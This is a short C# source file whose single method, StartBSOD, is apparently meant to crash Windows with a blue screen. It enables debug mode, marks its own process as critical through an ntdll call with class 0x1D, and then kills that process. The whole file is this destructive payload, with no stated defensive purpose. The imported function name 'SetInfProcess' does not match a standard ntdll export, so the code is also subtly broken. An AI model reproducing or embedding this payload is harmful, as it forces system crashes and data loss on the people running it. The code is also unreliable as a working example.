using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace andkfox.bsod
{
    public static class bsod
    {
        [DllImport("ntdll.dll")]
        private static extern int SetInfProcess(IntPtr proces, int prcClass, ref int prcValue, int length);

        public static void StartBSOD()
        {
            Process.EnterDebugMode();
            int st = 1;
            SetInfProcess(Process.GetCurrentProcess().Handle, 0x1D, ref st, sizeof(int));
            Process.GetCurrentProcess().Kill();
        }
    }
}
